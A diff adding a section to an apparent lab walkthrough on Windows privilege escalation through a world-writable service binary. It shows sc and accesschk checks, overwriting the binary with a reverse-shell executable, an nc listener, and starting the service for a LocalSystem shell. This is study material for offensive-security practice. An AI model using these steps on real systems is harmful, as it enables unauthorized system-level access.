@@ -731,6 +731,98 @@ copy \\10.8.47.102\kali\reverse.exe C:\PrivEsc\reverse.exe
 
 - <details>
       <summary>Insecure Service Executables</summary>
+
+     
+     ## 1. Query the service configuration
+     
+     ```ruby
+     sc qc filepermsvc
+     ```
+     
+     - **`sc`** : `(Service Control)` Tool in windows
+     - **`qc`** : `(Query Configuration)` to get service settings
+     
+     ---
+     
+     ```ruby
+             BINARY_PATH_NAME   : "C:\Program Files\File Permissions Service\filepermservice.exe"
+             SERVICE_START_NAME : LocalSystem
+     ```
+     
+     
+     <img width="856" height="276" alt="image" src="https://github.com/user-attachments/assets/8def86f3-a0a7-4c06-9e67-bd75f5a2f2ba" />
+     
+     ---
+     
+     ## 2. Check file permissions with accesschk
+     
+     ```ruby
+     C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
+     ```
+     
+     - **`accesschk.exe`** : Tool from _Sysinternals_
+     - **`/accepteula`** : It means "I agree to the user agreement" (required the first time).
+     - **`-quvw`**
+        - **`q`** : quiet
+        - **`u`** : show user-specific permissions
+        - **`v`** : `verbose` More detail
+        - **`w`** : It focuses on write permissions (who has the authority to write to the file).
+     - **`"C:\Program Files\File Permissions Service\filepermservice.exe"`** : The file whose permissions we want to see.
+     
+     ---
+     
+     ```ruby
+      RW Everyone
+             FILE_ALL_ACCESS
+     ```
+     
+     ### - `🚨 that is mean every one on this system They have almost all the permissions on the file (read, write, modify, delete...).`
+     
+     
+     
+     <img width="923" height="268" alt="image" src="https://github.com/user-attachments/assets/71ec6c24-5cf3-4433-91dd-595bb89f31d8" />
+     
+     
+     
+     ## 3. Replace the service binary
+     
+     
+     ```ruby
+     copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
+     ```
+     
+     - **`copy`** : File copy command.
+     - **`C:\PrivEsc\reverse.exe`** : The reverse shell we created (our malicious file).
+     - **`"C:\Program Files\File Permissions Service\filepermservice.exe"`** : The original file of the service.
+     - **`/Y`** : He lets the copying happen without asking you, “Are you sure you want to overwrite?”
+     
+     
+     <img width="886" height="135" alt="image" src="https://github.com/user-attachments/assets/549d2f3a-bbfa-478d-8937-8b2065bd3199" />
+     
+     
+     ## 4. Start listener on Kali
+     
+     ```ruby
+     nc -lvnp 4444
+     ```
+     
+     ## 5. Start the service
+     
+     ```ruby
+     net start filepermsvc
+     ```
+     
+     - **`net`** : A Windows tool for managing networks and services.
+     - **`start`** : Service run command.
+     - **`filepermsvc`** : service name
+     
+     
+     <img width="1003" height="272" alt="image" src="https://github.com/user-attachments/assets/9898c0ad-670a-4870-aa16-862b6406cdb2" />
+     
+     
+
+
+
   </details>
   
 
